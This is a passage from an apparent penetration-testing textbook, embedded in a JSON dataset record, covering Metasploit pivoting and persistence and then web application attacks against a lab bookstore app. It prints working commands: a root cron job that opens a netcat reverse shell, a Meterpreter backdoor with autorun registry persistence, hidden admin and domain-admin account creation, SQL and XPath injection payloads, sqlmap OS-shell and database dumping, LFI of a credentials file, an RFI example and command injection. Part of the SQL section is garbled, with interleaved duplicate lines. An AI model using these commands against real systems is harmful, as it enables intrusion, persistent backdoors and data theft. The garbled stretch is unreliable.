exploited system\nAt this point we could start uploading our hack tools to the Windows 7\ntarget to begin the penetration test on the 172.16.85.0 network, but that\nattempt would likely be caught by antivirus software, and we’d have to clean\nup the mess left behind. Metasploit gives us another option: We can route\nall of the traffic for our target network through an open Metasploit session.\nAdding a Route in Metasploit\nThe route command in Metasploit tells Metasploit where to route traffic.\nInstead of routing traffic to an IP address, we send traffic destined for a net-\nwork through a specific open session. In this case, we want to send all traf-\nfic headed to the 172.16.85.0 network through the Windows 7 session. The\nsyntax for the route command in Metasploit is route add network <subnet mask>\n<session id>.\nmsf > route add 172.16.85.0 255.255.255.0 2\nPost Exploitation 305\nNow any traffic we send from Metasploit to the 172.16.85.0 network will\nautomatically be routed through the Windows 7 session (session 2 in my\ncase). We can set options such as RHOST or RHOSTS to systems in this network,\nand Metasploit will get traffic to the right place.\nMetasploit Port Scanners\nOne of the first things we did when information gathering in Chapter 5 was\nto port scan our targets with Nmap. We won’t be able to use external tools\nwith our Metasploit route, but luckily Metasploit has some port-scanning\nmodules we can use instead, like the scanner/portscan/tcp module, which will\nperform a simple TCP port scan, as shown in Listing 13-29.\nmsf > use scanner/portscan/tcp\nmsf auxiliary(tcp) > show options\nModule options (auxiliary/scanner/portscan/tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nCONCURRENCY 10 yes The number of concurrent ports to check per host\nPORTS u1-10000 yes Ports to scan (e.g. 22-25,80,110-900)\nRHOSTS yes The target address range or CIDR identifier\nTHREADS 1 yes The number of concurrent threads\nTIMEOUT 1000 yes The socket connect timeout in milliseconds\nmsf auxiliary(tcp) > set RHOSTS 172.16.85.190\nrhosts => 172.16.85.190\nmsf auxiliary(tcp) > exploit\n[*] 172.16.85.190:25 - TCP OPEN\n[*] 172.16.85.190:80 - TCP OPEN\n[*] 172.16.85.190:139 - TCP OPEN\n[*] 172.16.85.190:135 - TCP OPEN\n[*] 172.16.85.190:180 - TCP OPEN\n--snip--\nListing 13-29: Port scanning with Metasploit\nSet the RHOSTS option as usual for auxiliary modules. By default Metasploit\nscans port 1-10000 u, though you can change this option if you wish.\nThough Metasploit’s port scanners are not as powerful as Nmap’s, we\ncan at least see that the SMB port is open. From here we might run the\nauxiliary/scanner/smb/smb_version module followed by the check function with\nthe windows/smb/ms08_067_netapi module to lead us toward exploiting the\nWindows XP target with the MS08-067 exploit through a pivot.\nRunning an Exploit through a Pivot\nBecause our Windows XP and Kali systems are on different networks, a\nreverse payload won’t work for our exploit because the Windows XP target\nwon’t know how to route traffic back to 192.168.20.9. (Of course, if our Kali\nsystem was on the Internet and the internal network we are attacking could\nroute to the Internet, that would not be the case. However, here our host-\nonly network does not know how to route to our bridged network.) Instead,\n306 Chapter 13\nwe’ll use a bind payload. Metasploit’s bind handler will have no trouble rout-\ning through the pivot we set up. The windows/meterpreter/bind_tcp payload\nwill work as shown in Listing 13-30.\nmsf exploit(handler) > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set RHOST 172.16.85.190\nRHOST => 172.16.85.190\nmsf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp\npayload => windows/meterpreter/bind_tcp\nmsf exploit(ms08_067_netapi) > exploit\nListing 13-30: Exploiting through a pivot\nWe’ve gotten another session, this time through a pivot.\nSocks4a and ProxyChains\nPivoting through Metasploit is all well and good, but we’re limited to using\nMetasploit modules. Perhaps there is a way to proxy other tools through\nMetasploit’s pivot? In fact there is: using the ProxyChains tool (which\nredirects traffic to proxy servers) to send our traffic from other Kali tools\nthrough Metasploit.\nBut first we need to set up a proxy server in Metasploit. Like the SMB\nserver module we used to capture NETLM and NETNTLM hashes ear-\nlier in this chapter, Metasploit also has a Socks4a proxy server module\n(auxiliary/server/socks4a). Listing 13-31 shows how to set up the proxy\nserver.\nmsf > use auxiliary/server/socks4a\nmsf auxiliary(socks4a) > show options\nModule options (auxiliary/server/socks4a):\nName Current Setting Required Description\n---- --------------- -------- -----------\nSRVHOST 0.0.0.0 yes The address to listen on\nSRVPORT 1080 yes The port to listen on.\nmsf auxiliary(socks4a) > exploit\n[*] Auxiliary module execution completed\n[*] Starting the socks4a proxy server\nListing 13-31: Setting up a Socks4a proxy server in Metasploit\nLeave the options as the defaults, but note that the server will be listen-\ning on port 1080.\nNow we need to edit the configuration file for ProxyChains at /etc/\nproxychains.conf. Scroll down to the bottom of the file in an editor, and you\nshould see that by default, ProxyChains is set to route traffic to the Tor net-\nwork as shown here.\nPost Exploitation 307\n# add proxy here ...\n# defaults set to “tor”\nsocks4 127.0.0.1 9050\nWe need to change the proxy value to Metasploit’s listening server.\nReplace port 9050 (for Tor) with 1080 (for Metasploit). The line should\nnow read:\nsocks4 127.0.0.1 1080\nSave the configuration file for ProxyChains. Now we can run tools like\nNmap from outside Metasploit against our Windows XP target, as long as we\npreface them with proxychains as shown in Listing 13-32. (The Metasploit\nroute must still be active because ProxyChains simply redirects the traffic\nto Metasploit, which will forward the traffic through the pivot.)\nroot@kali:~# proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190\nProxyChains-3.1 (http://proxychains.sf.net)\nStarting Nmap 6.40 ( http://nmap.org ) at 2015-03-25 15:00 EDT\n|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190.165:445-<><>-OKu\n|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190:446-<--deniedv\nNmap scan report for 172.16.85.190\nHost is up (0.32s latency).\n\nPORT STATE SERVICE VERSION\n445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds\n446/tcp closed ddm-rdb\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nListing 13-32: Running Nmap through ProxyChains\nListing 13-32 shows Nmap being run against the Windows XP host\nthrough the pivot with ProxyChains. The option -Pn tells Nmap not to try\nto ping through the proxy. We start with a simple TCP connect scan (-sT)\nand then run a version scan (-sV). For the sake of simplicity, I’ve limited the\nports to 445 and 446 with the -p option. We see that the connection is OK on\nport 445 u but denied on port 446 v. This makes sense because the SMB\nserver is running on port 445, but nothing is running on port 446. (If any\nof this is unfamiliar, see “Port Scanning with Nmap” on page 125.)\nThis is just one way to run tools external to Metasploit through a pivot.\nWhile doing so does slow things down a bit, it can be quite useful to have\naccess to other tools in Kali.\nnote Not all vulnerabilities will be exploitable through a pivot. In general, it depends on\nhow the vulnerable protocols work. Another technique to look into is SSH tunneling.\nSee my blog at http://www.bulbsecurity.com/ for more information.\n308 Chapter 13\nPersistence\nA great thing about our Meterpreter sessions is also a bad thing. Because\nthe host process resides entirely in memory, if it dies, our Meterpreter ses-\nsion dies as well, and if the system restarts we lose our session. If we lose\nnetwork access to the target, our session may die as well.\nRather than re-exploiting the same vulnerability or resending social-\nengineering attacks, it would be ideal if we had a way to regain access in the\nfuture. Persistence methods can be as simple as adding a user to a system or\nas advanced as kernel-level rootkit that hides itself even from the Windows\nAPI making it virtually undetectable. In this section we’ll look at a few simple\nways to gain persistence on a target system to give you a good starting point\nfor your pentests.\nAdding a User\nPerhaps the simplest way to gain persistence is to add a new user. Being able\nto log in to the system directly via SSH, RDP, and so on makes it easy to access\na system in the future. (As with all other changes you make on your targets,\nremember to delete any added user accounts before finishing the pentest.)\nOn a Windows system, use net user username password /add to add a new\nuser, as shown here.\nC:\\Documents and Settings\\georgia\\Desktop> net user james password /add\nnet user james password /add\nThe command completed successfully.\nWe should also add our new user to the relevant groups with the com-\nmand net localgroup group username /add. For example, if we want to log in\nvia remote desktop, we should add the user to the Remote Desktop Users\ngroup. The Administrators group is also a good group to add our user to as\nshown here.\nC:\\Documents and Settings\\georgia\\Desktop> net localgroup Administrators james /add\nnet localgroup Administrators james /add\nThe command completed successfully.\nIf your client has a Windows domain, you can add users to the domain\nand add them to domain groups (if you have sufficient privileges) by tack-\ning on /domain at the end of a command. For example, if you are able to steal\na domain administrator’s token, you can use the following commands to\nadd a domain administrator account, giving you full control of the entire\ndomain.\nC:\\Documents and Settings\\georgia\\Desktop> net user georgia2 password /add /domain\nC:\\Documents and Settings\\georgia\\Desktop> net group \"Domain Admins\" georgia2 /add /domain\nOn the Linux target, we can use adduser to add a user account. Ideally we\nshould also add our new user to the sudoers group so we have root privileges.\nPost Exploitation 309\nMetasploit Persistence\nThe Meterpreter script persistence automates the creation of a Windows back-\ndoor that will automatically connect back to a Metasploit listener at startup,\nlogin, and so on, based on the options we use when creating it. The options\nfor the persistence script are shown in Listing 13-33.\nmeterpreter > run persistence -h\nMeterpreter Script for creating a persistent backdoor on a target host.",
    "question": "What are the key methods and tools discussed in the text for bypassing antivirus detection and gaining persistent access to a target system after initial exploitation?",
    "summary": "Veil-Evasion is a tool that allows the creation of malicious executables to bypass antivirus detection by using encryption and injection methods. It provides 28 payloads, including the VirtualAlloc injection method with AES encryption, which can evade Microsoft Security Essentials. Additionally, it offers options to generate payloads using tools like Pyinstaller. The tool also notes that Metasploit should be updated to ensure compatibility with the latest versions. \n\nPost-exploitation involves gathering information, escalating privileges, and moving laterally within a network. Metasploit provides various modules for these tasks, such as keylogging, credential gathering, and privilege escalation. Tools like PSExec and SSHExec can be used to access other systems, while techniques like token impersonation and pass-the-hash allow bypassing password requirements. Metasploit also supports pivoting through routes and proxy chains to access systems on different networks. \n\nMetasploit's persistence features automate the creation of a backdoor that maintains access to a system after a session is terminated. This includes setting up a Windows backdoor that connects back to a listener at startup or login. The tool also allows for the use of Meterpreter scripts to enhance post-exploitation capabilities."
  },
  {
    "start": 93,
    "end": 96,
    "text": "OPTIONS:\n-A Automatically start a matching multi/handler to connect to the agent\n-L <opt> Location in target host where to write payload to, if none %TEMP% will be used. -P <opt> Payload to use, default is windows/meterpreter/reverse_tcp. -S Automatically start the agent on boot as a service (with SYSTEM privileges)\n-T <opt> Alternate executable template to use\n-U Automatically start the agent when the User logs on\n-X Automatically start the agent when the system boots\n-h This help menu\n-i <opt> The interval in seconds between each connection attempt\n-p <opt> The port on the remote host where Metasploit is listening\n-r <opt> The IP of the system running Metasploit listening for the connect back\nListing 13-33: Meterpreter persistence script\nAs you can see we have a lot of customization options for our persistent\npayload. We can have the persistence agent start at boot or when the user\nlogs in. We can set an interval between attempts to connect to the handler. We can change where the agent is written on the target system. We can also\nspecify the remote host and port for the agent to connect back to. We can\neven have Metasploit automatically set up a handler to catch the incom-\ning connection. In the process of setting up persistence, Metasploit has to\nwrite the persistence agent to the disk, so Meterpreter is no longer com-\npletely residing in memory at this point. When the persistence agent runs at\nstartup (-X), a Visual Basic script is uploaded to the %TEMP% folder, and\na registry entry is added to the list of programs to run at startup. When the\npersistence agent runs upon login (-U), the process is similar, but the regis-\ntry entry is set to run at login. When the persistence agent runs as a service\n(-S), a Windows system service is created that will call the Visual Basic script\nfrom %TEMP%. Let’s run the persistence script, as shown in Listing 13-34, telling the\nagent to connect back to our Kali machine when the user logs in. meterpreter > run persistence -r 192.168.20.9 -p 2345 -U\n[*] Running Persistence Script\n[*] Resource file for cleanup created at /root/.msf4/logs/persistence/BOOKXP_20150814.1154/\nBOOKXP_20150814.1154.rc\n[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345\n[*] Persistent agent script is 614853 bytes long\n[+] Persistent Script written to C:\\WINDOWS\\TEMP\\eTuUwezJblFHz.vbs\n[*] Executing script C:\\WINDOWS\\TEMP\\eTuUwezJblFHz.vbs\n310 Chapter 13\n[+] Agent executed with PID 840\n[*] Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BJkGfQLhXD\n[+] Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BJkGfQLhXD\nListing 13-34: Running the persistence script\nAfter running the script, place the Meterpreter session in the back-\nground with the Meterpreter command background, and set up a handler\nto catch the persistence agent. Now restart the Windows XP target. When\nit restarts, log in as georgia, and you should receive another Meterpreter\nsession. note If it doesn’t work the first time, try restarting and logging in again. Creating a Linux cron Job\nOn both Windows and Linux systems, we can automatically start tasks at\na given time. For example, we can set up a cron job to automatically run a\nMetasploit payload or even just use Netcat to connect back to us. Open /etc/crontab on your Linux target. The following line will run the\ncommand nc 192.168.20.9 12345 -e /bin/bash every ten minutes of every hour\nof every day of every month—basically every ten minutes. The command will\nbe run as root. Add this line to the end of the /etc/crontab file. (For help, see\n“Automating Tasks with cron Jobs” on page 72.)\n*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash\nNow restart the cron service by entering service cron restart. Set up a\nNetcat listener on port 12345 on your Kali machine, and at the next ten-\nminute mark, the cron job should run, and you should receive a root shell at\nyour Netcat listener. summary\nIn this chapter we’ve covered just a few post-exploitation techniques, barely\nskimming the surface of the wealth of interesting tools and techniques\navailable. We looked at some methods for escalating our privileges on an\nexploited system. We also looked at methods of gathering local informa-\ntion. We studied methods of turning access to one system into access to\nmany, including pivoting from one network to another through an open\nsession. Finally, we looked at a couple of methods for making our access\npermanent. Post Exploitation 311\n14\nweB aPPliCation testing\nThough automated scanners are great at finding\nknown vulnerabilities in web applications, many cli-\nents build custom web applications. Sure, commercial\nproducts can automate attacks against user input fields\nin custom web applications, but nothing can replace a\ngood penetration tester with a proxy when it comes to\nfinding security issues in these applications. Like all software, web applications may have issues when input is not\nproperly sanitized. For example, when an application pulls data from a data-\nbase based on certain user input, the application may expect specific input\nsuch as a username and password. If, instead, the user enters special input\nto create additional database queries, he or she may be able to steal data\nfrom the database, bypass authentication, or even execute commands on\nthe underlying system. In this chapter we’ll look at finding some common vulnerabilities in web\napplications using the example web application installed on the Windows 7\ntarget: a simple bookstore with several security issues frequently found in web\napplications. (See “Installing Additional Software” on page 52 for instal-\nlation instructions.)\nusing Burp Proxy\nWe can use a proxy to capture requests and responses between our browser\nand the web application so we can see exactly what data is being transmitted. Kali Linux comes with the free version of Burp Suite, a testing platform for\nweb applications that includes a proxy feature. Burp includes other useful\ncomponents, such as Burp Spider, which can crawl through web application\ncontent and functionality, and Burp Repeater, which allows you to manipu-\nlate and resend requests to the server. For now, we’ll focus on the Burp\nProxy tab. To start Burp Suite in Kali Linux, go to Applications at the top left\nof the Kali GUI, and then click Kali Linux4Web Applications4Web\nApplication Fuzzers4burpsuite, as shown in Figure 14-1. Figure 14-1: Starting Burp Suite in Kali\nClick the Proxy tab, as shown in Figure 14-2. By default, the Intercept\nis on button should be selected so that Burp Suite intercepts and traps any\noutgoing requests from a web browser configured to use Burp as a proxy\nfor web traffic. This setting will allow us to see and even modify the details\nof web requests before they are sent to the server. 314 Chapter 14\nFigure 14-2: Burp Proxy interface\nNow we need to tell our browser in Kali Linux to proxy web traffic\nthrough Burp Suite. 1. Open the Iceweasel browser, go to Edit4Preferences4Advanced, and\nselect the Network tab. 2. Click Settings to the right of Connection. 3. In the Connection Settings dialog, shown in Figure 14-3, select Manual\nproxy configuration, and enter the IP address 127.0.0.1 and port 8080. This tells Iceweasel to proxy traffic through the localhost on port 8080,\nthe default port for Burp Proxy. Figure 14-3: Setting a proxy in Iceweasel\nWeb Application Testing 315\nTo ensure that Iceweasel will proxy all our traffic through Burp Suite,\nbrowse to the URL bookservice on your Windows 7 target: http://192.168.20.12/\nbookservice. The connection should appear to hang in the browser, and the\nbrowser and Burp Suite should light up as the HTTP GET request for the\nmain page of the bookservice site is captured by Burp Proxy, as shown in\nFigure 14-4. Figure 14-4: Captured HTTP GET request\nWe can see the details of the HTTP GET request asking the server for the\nbookservice web page. As we will see later, we can make changes to the request before sending\nit on to the server, but for now, let’s just go ahead and forward the request\n(and any subsequent ones) by clicking the Forward button. Returning to\nthe browser, we see the server has sent us the main page of the bookservice\nsite, as shown in Figure 14-5. 316 Chapter 14\nFigure 14-5: Bookservice site\nNext let’s try signing up for an account (Figure 14-6). Click Login at\nthe top left of the page, and then forward the request to the server from the\nproxy. Do the same to get to the Sign Up page by clicking New User and\nforwarding the request to the server. Figure 14-6: Signing up for a new account\nEnter a username, password, and email address, then submit the request\nby clicking Go. The request should be captured in Burp Proxy, as shown in\nFigure 14-7. Web Application Testing 317\nFigure 14-7: Captured request\nIn addition to looking at the raw request, which is a bit unfriendly to\nread, you can click the Params tab at the top of the request window in Burp\nSuite to display the request parameters in a more readable format, as shown\nin Figure 14-8. Figure 14-8: Request parameters\n318 Chapter 14\nFor example, the new display shows the User field georgia, Pass field\npassword, and Email field georgia@bulbsecurity.com. You can change these fields directly in the proxy. For example, if you\nchange georgia’s password to password1 before forwarding the request to the\nserver, the server will set the password for user georgia to password1, because\nthe server never saw the original request from the browser requesting the\npassword password. The proxy allows you to see the details of any request to the server. If\nat any point you don’t need to proxy traffic, click Intercept is on to toggle\nit to Intercept is off and allow traffic to pass through to the server without\nuser interaction. Switch the button back on if you want to catch a particular\nrequest. sQL injection\nMany web applications store data in a backend, SQL-based database. For\nexample, we encountered a SQL database during our network penetration\ntest, when we found an open MySQL database through phpMyAdmin in the\nXAMPP install on the Windows XP target on page 186. We then used a\nSQL query to write a simple PHP command shell to the web server. We typically won’t have direct access to run SQL queries on a site’s\nbackend database from a web application. However, if a developer fails to\nsanitize user input when interacting with the database, you may find that\nyou can perform a SQL injection attack to manipulate the queries sent to it. Successful SQL injection attacks can read data from the database, modify\ndata, shut down or destroy the database, and, in some cases, even run com-\nmands on the underlying operating system (which can be especially power-\nful because database servers often run as privileged users). A natural place to look for SQL injection issues is in the login page. Many web applications store user data in a database, so we can use a SQL\nquery to pull out the correct user, based on the username and password\nprovided by the user. When developers don’t sanitize user input, we can\nbuild SQL queries to attack the database. An example of an injectable SQL\nstatement that could be leveraged by an attacker is shown here:\nSELECT id FROM users WHERE username='$username' AND password='$password';\nWhat if an attacker supplied a username ' OR '1'='1 and the user’s pass-\nword was ' OR '1'='1? The SQL statement turns into:\nSELECT username FROM users WHERE username='' or '1'='1' AND password='' or '1'='1'\nBecause the OR '1'='1' will always be true, this SELECT statement will now\nreturn the first username in the user table, regardless of the username and\npassword. Web Application Testing 319\nau: inserted space\nin “ms sql” – ok? As we’ll see in “XPath Injection” on page 323, our application uses\nXpath, a query language for XML documents, which authenticates against\nan XML file rather than a database, though the injection process is similar. However, our application does use a SQL database to store records of the\nbooks available in the store, and when we select a book on the main page,\nits details are pulled from an MS SQL backend database.\n\nFor example,\nclick the More Details link for the first book on the site, Don’t Make Me\nThink. The URL requested is:\nhttp://192.168.20.12/bookservice/bookdetail.aspx?id=1\nThe book’s details are filled in based on the results returned from the\ndatabase query for the record with ID 1. Testing for SQL Injection Vulnerabilities\nA typical first test for SQL injection vulnerabilities is to use a single quotation\nmark to close the SQL query. If a SQL injection vulnerability is present, the\naddition of that quotation mark should cause the application to throw a SQL\nerror, because the query will already be closed as part of the underlying\ncode and the extra single quote will cause the SQL syntax to be incorrect. That error will tell us that we can inject SQL queries to the site’s database\nusing the id parameter. Let’s try this out by sending the query again with the id parameter to 1',\nas shown here. http://192.168.20.12/bookservice/bookdetail.aspx?id=1'\nAs expected, the application serves an error page indicating that our\nSQL syntax is incorrect, as shown in Figure 14-9. Figure 14-9: The application identifies a SQL error. In particular, note the message “Unclosed quotation mark after the\ncharacter string” in our SQL query. 320 Chapter 14\nau: inserted space\nin “ms sql” – ok? As we’ll see in “XPath Injection” on page 323, our application uses note Not all applications that are vulnerable to SQL injection will be so verbose with their\nXpath, a query language for XML documents, which authenticates against error messages. In fact, there is a whole class of blind SQL injection vulnerabilities,\nan XML file rather than a database, though the injection process is similar. where error messages detailing the injection are not shown, even though the injection\nHowever, our application does use a SQL database to store records of the flaw is still present. books available in the store, and when we select a book on the main page,\nits details are pulled from an MS SQL backend database. For example,\nExploiting SQL Injection Vulnerabilities\nclick the More Details link for the first book on the site, Don’t Make Me\nThink. The URL requested is: Now that we know a SQL injection vulnerability is present in this site, we\ncan exploit it to run additional queries on the database that the developer\nhttp://192.168.20.12/bookservice/bookdetail.aspx?id=1 never intended. For example, we can find out the name of the first database\nwith the following query:\nThe book’s details are filled in based on the results returned from the\ndatabase query for the record with ID 1. http://192.168.20.12/bookservice/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--\nTesting for SQL Injection Vulnerabilities The query throws an error message, Conversion failed when converting the\nnvarchar value ‘BookApp’ to data type int, which tells us that the name of the first\nA typical first test for SQL injection vulnerabilities is to use a single quotation\ndatabase is BookApp, as shown in Figure 14-10. mark to close the SQL query. If a SQL injection vulnerability is present, the\naddition of that quotation mark should cause the application to throw a SQL\nerror, because the query will already be closed as part of the underlying\ncode and the extra single quote will cause the SQL syntax to be incorrect. That error will tell us that we can inject SQL queries to the site’s database\nusing the id parameter. Let’s try this out by sending the query again with the id parameter to 1',\nas shown here. http://192.168.20.12/bookservice/bookdetail.aspx?id=1'\nAs expected, the application serves an error page indicating that our\nSQL syntax is incorrect, as shown in Figure 14-9. Figure 14-10: Error message showing the database name\nUsing SQLMap\nWe can also use tools to automatically generate SQL queries to perform var-\nious tasks on a site using SQL injection. All we need is an injection point;\nthe tool does the rest. For example, Listing 14-1 shows how when we give a\ntool in Kali SQLMap a potentially injectable URL, SQLMap tests for SQL\ninjection vulnerabilities and performs injection queries. root@kali:~# sqlmap -uu \"http://192.168.20.12/bookservice/bookdetail.aspx?id=2\" --dumpv\n--snip--\nFigure 14-9: The application identifies a SQL error. [21:18:10] [INFO] GET parameter 'id' is 'Microsoft SQL Server/Sybase stacked queries' injectable\n--snip--\nIn particular, note the message “Unclosed quotation mark after the Database: BookApp\nTable: dbo.BOOKMASTER\ncharacter string” in our SQL query. [9 entries]\n+--------+---------------+-------+-------+-------------------------------------\nWeb Application Testing 321\n| BOOKID | ISBN | PRICE | PAGES | PUBNAME | BOOKNAME\n| FILENAME | AUTHNAME | DESCRIPTION\n|\n+--------+---------------+-------+-------+-------------------------------------\n| 1 | 9780470412343 | 11.33 | 140 | Que; 1st edition (October 23, 2000) | Do not Make\nMe Think A Common Sense Approach to Web Usability |\n4189W8B2NXL.jpg | Steve Krug and Roger Black | All of the tips, techniques, and examples\npresented revolve around users being able to surf merrily through a well-designed site\nwith minimal cognitive strain. Readers will quickly come to agree with many of the books\nassumptions, such as We do not read pages--we scan them and We do not figure out how things\nwork--we muddle through. Coming to grips with such hard facts sets the stage for Web design\nthat then produces topnotch sites. |\n--snip-- |\nListing 14-1: Dumping the database with SQLMap\nSpecify the URL to test with -u option u. The --dump option v dumps\nthe contents of the database—in this case, details of the books. We can also use SQLMap to try to get command-shell access on the\nunderlying system. MS SQL databases contain a stored procedure called\nxp_cmdshell, which will give us command-shell access, but it’s often disabled. Luckily, SQLMap will try to reenable it. Listing 14-2 shows how we can get\na command shell on the site’s underlying Windows 7 target system using\nSQLMap. root@kali:~# sqlmap -u \"http://192.168.20.12/bookservice/bookdetail.aspx?id=2\" --os-shell\n--snip--\nxp_cmdshell extended procedure does not seem to be available. Do you want sqlmap to try to\nre-enable it? [Y/n] Y\n--snip--\nos-shell> whoami\ndo you want to retrieve the command standard output? [Y/n/a] Y\ncommand standard output: 'nt authority\\system'\nListing 14-2: xp_cmdshell access through SQL injection\nAs you can see in Listing 14-2, we receive a shell running as System with-\nout having to guess credentials for the database. note The MS SQL database is not listening on a port anyway, so we can’t access it directly. Unlike our Windows XP system in Chapter 6, this web server lacks phpMyAdmin, so\nwe have no other way to access the database. A SQL injection issue in the hosted web-\nsite gives us full system access. 322 Chapter 14\nxPath injection\nAs mentioned previously, this bookservice application uses XML authen-\ntication, in which the XML is queried using Xpath. We can use XPath\ninjection to attack XML. Though its syntax differs from SQL, the injection\nprocess is similar. For example, try entering single quotes (') for both the username and\npassword fields at the login page. You should receive an error like the one\nshown in Figure 14-11. Figure 14-11: XML error at login\nAs you can see from the error message shown in Figure 14-11, we again\nhave an injection issue because we have an error in our syntax. Because\nwe are at a login page, a typical injection strategy for Xpath would be to\nattempt to bypass authentication and gain access to the authenticated por-\ntion of the application by attacking the Xpath query logic. For example, as shown in the error details, the login query grabs the\nusername and password provided, and then compares the values provided\nagainst credentials in an XML file. Can we create a query to bypass the\nneed for valid credentials? Enter a set of dummy credentials at login, and\ncapture the request with Burp Proxy, as shown in Figure 14-12. Now change the txtUser and txtPass parameters in the captured request\nto this value. ' or '1'='1\nWeb Application Testing 323\nFigure 14-12: Captured login request\nThis tells the login Xpath query to find the user account where the\nusername and password field is blank or 1=1. Because 1=1 always evaluates\nas true, the logic of this query says to return the user where the username\nis blank or present—likewise with the password. Thus using this injection\nmethod, we can get the application to log us in as the first user in the authen-\ntication file. And, as shown in Figure 14-13, we are logged in as the user Mike. Figure 14-13: Authentication bypass through Xpath injection\nLocal File inclusion\nAnother vulnerability commonly found in web applications is local file inclu-\nsion, which is the ability to read files from the application or the rest of the\nfilesystem that we should not have access to through the web app. We saw an\nexample of this in Chapter 8 where the Zervit web server on the Windows XP\ntarget allowed us to download files from the target, such as a backup of the\nSAM and SYSTEM hives. Our bookservice app also suffers from local file inclusion. As user Mike,\ngo to Profile4View Newsletters. Click the first newsletter in the list to view\nthe contents of the file, as shown in Figure 14-14. 324 Chapter 14\nFigure 14-14: Viewing a newsletter\nNow resend the request, and capture it with Burp Proxy, as shown in\nFigure 14-15. Figure 14-15: Captured newsletter request\nClick the Params tab, and note the parameter c:\\inetpub\\wwwroot\\Book\\\nNewsLetter\\Mike@Mike.com\\Web Hacking Review.txt. The path c:\\inetpub\\wwwroot\\\nBook\\NewsLetter\\Mike suggests that the newsletter functionality is pulling the\nnewsletters from the local filesystem by their absolute path. It also looks like\nthere’s a folder called Mike@Mike.com in the Newsletter folder. Perhaps each\nuser subscribed to the newsletters has such as folder. It also seems as if our application is actually at the path c:\\inetpub\\\nwwwroot\\Book, as noted in the newsletter requests, instead of c:\\inetpub\\\nwwwroot\\bookservice as we might expect from the URL. We note this\nbecause it may come in handy later on. Web Application Testing 325\nWhat if we change the filename parameter to another file in the web\napplication? Can we gain access to the app’s full source code? For example,\nchange the file to the following, and forward the request to the server. C:\\inetpub\\wwwroot\\Book\\Search.aspx\nAs you can see, the source\ncode of the Search.aspx page\nis displayed in the Newsletter\nbox, as shown in Figure 14-16. Having access to the full\nserver-side source code of the\nweb application allows us to do\na complete source code review\nto look for issues. But perhaps we can access\neven more sensitive data. For\nexample, we know that the\nusernames and passwords are\nstored in an XML file. Perhaps\nwe can request this file. We\nFigure 14-16: Local file inclusion vulnerability\ndon’t know its name, but a few\nguesses for common filenames\nin XML authentication scenar-\nios will lead us to the filename AuthInfo.xml. Capture the newsletter request\nin Burp Proxy, and change the requested file to the one shown here. C:\\inetpub\\wwwroot\\Book\\AuthInfo.xml\nAs you can see in Figure\n14-17, we now have access to\nthe usernames and passwords\nin plaintext. Now we know why\nour previous Xpath injection\nlogged us in as the user Mike:\nMike is the first user in the file. This is a prime example\nof when using a proxy comes\nin handy. A user with just a\nbrowser would have been lim-\nited to only the files he or she\ncould click on, namely the\nnewsletters presented. On the\nother hand, with the proxy\nFigure 14-17: Authentication info\nwe are able to see the request\nask for a specific file from the\n326 Chapter 14\nfilesystem. By changing the filename manually in the request using Burp\nProxy, we were able to see other sensitive files. No doubt the developer did\nnot consider the possibility that the user could just ask for any file and,\nthus, did not think to limit the files that could be accessed through the\nuser’s newsletters. Worse still, we aren’t limited to files from the web application.\n\nWe can\nload any file from the filesystem that the IIS_USER has read access to. For\nexample, if you create a file called secret.txt on the C: drive, you can load it\nthrough the newsletters functionality. Just substitute the file you want in the\nrequest in Burp Suite. If we can find a way to upload files to a web applica-\ntion, we can even use LFI vulnerability to execute malicious code on the\nwebserver. remote File inclusion\nRemote file inclusion (RFI) vulnerabilities allow attackers to load and\nexecute malicious scripts, hosted elsewhere, on a vulnerable server. In\nChapter 8, we used the open phpMyAdmin interface in XAMPP to write a\nsimple PHP shell and finally a PHP version of Meterpreter to the web server. Though we are not uploading a file to the server here, the attack is similar. If we can trick the vulnerable server into executing a remote script, we can\nrun commands on the underlying system. Our site does not have a remote file inclusion vulnerability, but simple\nvulnerable PHP code is shown here as an illustration. <?php\ninclude($_GET[‘file’]);\n?>\nAn attacker can host a malicious PHP script (such as the meterpreter.php\nscript we used in Chapter 8) on their webserver and request the page with the\nfile parameter set to http://<attacker_ip>/meterpreter.php. The RFI vulnerability\nwould cause meterpreter.php to be executed by the webserver even though it is\nhosted elsewhere. Of course, our example application is ASP.net not PHP, but\nMsfvenom can create payloads in ASPX format for these sorts of apps. Command execution\nAs noted earlier, the Newsletters folder contains a folder called Mike@Mike\n.com. Logically, this suggests that the site may contain similar folders with\nthe email addresses of all users signed up to receive newsletters. Some part\nof the application must be creating these folders as users register or sign\nup for the newsletter. The application’s code is probably running a com-\nmand to create the folders on the filesystem. Perhaps, again through lack of\ninput validation, we can run additional commands that the developer never\nintended us to run. Web Application Testing 327\nAs shown in Figure 14-18, the bottom\nright of the web app contains a form to sign\nup for newsletters. We suspect that when we\nenter an email address, a folder is created for\nthat email address in the newsletters folder. We guess that the email address input is\nfed to a system command to create a direc-\ntory in the newsletters folder. If the developer\ndoes not properly sanitize user input, we may\nbe able to run additional commands using\nthe ampersand (&) symbol. Figure 14-18: Newsletter\nWe’ll execute a command and send Signup\nits output to a file in our application’s\nC:\\inetpub\\wwwroot\\Book\\ directory, then\naccess the files directly to see the command’s\noutput. Run the ipconfig command on the Windows 7 target as shown here\nto pipe the output from a system command such as ipconfig to the file test.txt\nin the Book directory. georgia@bulbsecurity.com & ipconfig > C:\\inetpub\\wwwroot\\Book\\test.txt\nWhen we browse to http://192.168.20.12/bookservice/test.txt, we see the\noutput of our ipconfig command, as shown in Figure 14-19. Figure 14-19: Command execution output\n328 Chapter 14\nWe will be limited to the privileges of the Internet Information Services\n(IIS) user. Unfortunately for us, the Microsoft IIS application on Windows 7\nsystems runs as a separate account without the full privileges of a system\nuser: a better security scenario for the developer but a more challenging\none for us. Though we don’t have full access, we will be able to gather a lot of\ninformation about the system with the access we do have. For example, 